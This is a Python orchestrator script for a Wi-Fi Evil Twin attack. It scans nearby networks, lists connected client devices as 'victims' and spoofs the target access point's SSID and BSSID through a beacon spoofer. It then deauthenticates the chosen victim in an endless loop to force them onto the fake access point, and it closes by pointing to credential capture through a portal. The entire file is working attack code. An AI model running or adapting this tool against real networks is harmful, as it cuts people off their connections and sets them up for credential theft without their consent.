"""
main.py

This is the orchestrator script for executing an Evil Twin attack using Python.
It allows the user to:
1. Select wireless interfaces for access point emulation and deauthentication.
2. Scan for available Wi-Fi networks.
3. Identify connected clients to a target network.
4. Launch a fake access point (Evil Twin).
5. Continuously deauthenticate the selected victim to force them onto the fake AP.

"""

from deauth import send_deauth as scapy_send_deauth
from network_scanner import scan_networks as scapy_scan
import os
import time
from client_scanner import find_clients as scapy_find_clients

import subprocess

def clear():
    """Clears the terminal screen."""
    os.system("clear" if os.name == "posix" else "cls")


def select_interfaces():
    """
    Prompts the user to select two interfaces:
    - One for hosting the Evil Twin AP
    - One for sending deauthentication packets (monitor mode)

    Returns:
    - iface_ap (str): Interface used to create the fake AP.
    - iface_deauth (str): Interface used for sending deauth packets.
    """
    clear()
    print("[1] Interface Selection")
    iface_ap = input("Enter your AP interface (e.g., wlx244bfe3caac2): ").strip()
    iface_deauth = input("Enter your deauth interface (e.g., wlxc83a35c2fcb0): ").strip()

    # Validate interfaces
    if not os.path.exists(f"/sys/class/net/{iface_ap}") or not os.path.exists(f"/sys/class/net/{iface_deauth}"):
        print("[-] One or both interfaces do not exist. Please check the interface names.")
        exit(1)

    # Put the deauth interface into monitor mode for packet injection
    os.system(f"sudo ip link set {iface_deauth} down")
    os.system(f"sudo iwconfig {iface_deauth} mode monitor")
    os.system(f"sudo ip link set {iface_deauth} up")
    print(f"[+] {iface_deauth} set to monitor mode.")

    os.system(f"sudo ip link set {iface_ap} down")
    os.system(f"sudo iwconfig {iface_ap} mode monitor")
    os.system(f"sudo ip link set {iface_ap} up")
    print(f"[+] {iface_ap} set to monitor mode.")

    return iface_ap, iface_deauth

def cleanup_interface(iface):
    """
    Restores a wireless interface to managed mode.

    Parameters:
    - iface (str): The wireless interface to revert.
    """
    print(f"\n[*] Reverting {iface} back to managed mode...")
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo iwconfig {iface} mode managed")
    os.system(f"sudo ip link set {iface} up")
    print(f"[+] {iface} is back in managed mode.")

def scan_networks(iface):
    """
    Scans for available Wi-Fi networks and prompts the user to choose one.

    Parameters:
    - iface (str): Interface in monitor mode used to scan for networks.

    Returns:
    - Tuple of (ssid, bssid, channel) for the selected network.
    """
    clear()
    print("[2] Scanning for Wi-Fi networks...")
    networks = scapy_scan(iface, timeout=60)
    
    if not networks:
        print("[-] No networks found.")
        retry = input("Try again? (y/n): ").strip().lower()
        if retry == 'y':
            return scan_networks(iface)
        else:
            exit("[!] Exiting.")
    
    # Display detected networks for user selection
    for i, (ssid, bssid, channel) in enumerate(networks):
        print(f"{i+1}) SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")
    choice = int(input("Select a network to spoof: ")) - 1
    # add error handling for invalid choice
    if choice < 0 or choice >= len(networks):
        print("[-] Invalid choice. Exiting.")
        exit(1)
    selected = networks[choice]
    return selected[0], selected[1], selected[2]

def find_clients(iface, ssid, ap_mac):
    """
    Scans for client devices associated with or probing for a given SSID.

    Parameters:
    - iface (str): Interface in monitor mode to use for scanning.
    - ssid (str): SSID to match probe requests against.
    - ap_mac (str): AP BSSID to match data frame associations.

    Returns:
    - MAC address of the selected client (str), or None if none are found.
    """
    clear()
    print("[3] Finding potential victims...")
    clients = scapy_find_clients(iface, target_ssid=ssid, target_bssid=ap_mac, timeout=15)
    if not clients:
        print("[-] No clients found.")
        return None
    # Display list of detected clients for selection
    for i, mac in enumerate(clients):
        print(f"{i+1}) Client MAC: {mac}")
    choice = int(input("Select a client to deauth: ")) - 1

    # add error handling for invalid choice
    if choice < 0 or choice >= len(clients):
        print("[-] Invalid choice. Exiting.")
        exit(1)
    
    return clients[choice]

def create_evil_twin(ssid, iface, ap_mac):
    """
    Launches the beacon spoofer to simulate a fake AP with the specified SSID and BSSID.

    Parameters:
    - ssid (str): The SSID to spoof.
    - iface (str): The interface used to broadcast the fake AP.
    - ap_mac (str): The MAC address to spoof as the AP's BSSID.

    Returns:
    - subprocess.Popen object for the background spoofer process.
    """
    clear()
    print(f"[4] Launching Evil Twin for SSID: {ssid}")

    # Kill any existing dnsmasq process before starting a new one
    os.system("sudo pkill dnsmasq")

    # Start the beacon spoofer as a background process
    spoofer = subprocess.Popen(["sudo", "python3", "beacon_spoofer.py", ssid, iface, ap_mac])
    print("[+] Beacon spoofer launched in background.")
    return spoofer

def send_deauth(victim_mac, ap_mac, iface, channel):
    """
    Sends deauthentication packets continuously to the specified victim.

    Parameters:
    - victim_mac (str): Target client's MAC address.
    - ap_mac (str): MAC address of the spoofed AP.
    - iface (str): Monitor-mode interface used for sending packets.
    - channel (int): Channel on which the AP is operating.
    """
    clear()
    print(f"[5] Sending deauth to {victim_mac} from AP {ap_mac} on channel {channel}")
    # Set the interface to the correct channel before sending deauth
    os.system(f"iwconfig {iface} channel {channel}")
    # Call the deauth function (likely sends a burst of packets)
    scapy_send_deauth(victim_mac, ap_mac, iface, channel)

def main():
    """
    Main execution loop:
    - Select interfaces
    - Scan for networks
    - Identify target client
    - Launch fake AP
    - Continuously deauthenticate victim
    """
    iface_ap, iface_deauth = select_interfaces()
    try:
        ssid, ap_mac, channel = scan_networks(iface_deauth)
        victim_mac = find_clients(iface_deauth, ssid, ap_mac)
        if victim_mac:
            spoofer_proc = create_evil_twin(ssid, iface_ap, ap_mac)
            print("[*] Starting continuous deauthentication... Press Ctrl+C to stop.")
            try:
                # Loop to repeatedly send deauth packets to victim
                while True:
                    send_deauth(victim_mac, ap_mac, iface_deauth, channel)
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Stopping attack...")
                # Terminate the background beacon spoofer process
                spoofer_proc.terminate()
                spoofer_proc.wait()
                os.system("sudo pkill dnsmasq")
                print("[+] Beacon spoofer terminated.")
        else:
            print("[!] No victim selected. Skipping attack.")
        print("[6] Evil Twin setup complete. Proceed with portal and credential capture...")
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Cleaning up...")
    finally:
        # Always restore the deauth interface to managed mode
        cleanup_interface(iface_deauth)

if __name__ == "__main__":
    main()
